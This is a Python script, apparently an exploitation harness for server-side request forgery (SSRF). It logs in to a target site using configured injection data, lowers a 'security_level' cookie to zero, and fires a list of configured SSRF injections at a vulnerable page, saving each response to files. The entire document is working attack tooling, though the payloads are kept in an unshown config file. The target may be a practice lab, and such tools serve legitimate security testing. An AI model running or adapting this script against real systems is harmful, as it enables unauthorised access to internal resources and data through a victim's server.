import argparse
import requests
import yaml
import os

def main():

    # Setup an arg parser to process incoming domain
    # ==============================================
    parser = argparse.ArgumentParser()
    parser.add_argument("-c", "--config_file",  help="Configuration file for ssrf exploitation", type=str, dest="config_file")
    args = parser.parse_args()
    # ===============================================

    # Ensure the domain is provided to the application
    # ================================================
    if args.config_file is None or args.config_file == "":
        print("Configuration file must be provided")
        print("EXITING")
        exit(-1)
    # ================================================

    # Get configuration from file
    # ===========================
    with (open(args.config_file) as file_stream):
        try:
            yaml_config = yaml.safe_load(file_stream)
        except yaml.YAMLError as e:
            print(e)
            exit(-1)
    # ===========================

    # Construct the url for the remote site and login page
    # ====================================================
    remote_site_url:str = "http://" + yaml_config['remote_host'] + ":" + yaml_config['remote_port']
    remote_login_page:str = remote_site_url + yaml_config['login_endpoint']
    # ====================================================

    # Request the login page to get intial cookies
    # ============================================
    response:requests.Reponse = requests.get(url=remote_login_page)
    # ============================================

    # Extract all expected session cookies
    # ====================================================
    session_cookies = {}
    for name in yaml_config['session_cookie_names']:
        session_cookies[name] = response.cookies.get(name)
    # ====================================================

    # headers = {
    #     "Content-Type": "application/x-www-form-urlencoded",
    #     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36",
    #     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    #     "Referer": remote_login_page,
    #     "Accept-Encoding": "gzip, deflate",
    # }

    # Login to the remote webpage
    # ====================================================
    response:requests.Response = requests.post(url=remote_login_page, 
                                               cookies=session_cookies, 
                                               #headers=headers, 
                                               data=yaml_config["post_login_injection_data"])
    # ====================================================

    # Extract all expected session cookies
    # ====================================================
    session_cookies = {}
    for name in yaml_config['session_cookie_names']:
        session_cookies[name] = response.cookies.get(name)
    # ====================================================

    vuln_webpage:str = remote_site_url + yaml_config['vuln_webpage']
    session_cookies['security_level'] = '0'

    for ssrf_injection in yaml_config['ssrf_injections']:

        if os.path.exists("output") == False:
            os.mkdir("output")

        with (open("output/" + ssrf_injection['name'], "w+")) as ssrf_file_out:
            ssrf_url:str = vuln_webpage + "?" + ssrf_injection['injection']
            response:requests.Response = requests.get(url=ssrf_url, cookies=session_cookies)
            ssrf_file_out.write(str(response.content))

if __name__ == "__main__":
    main()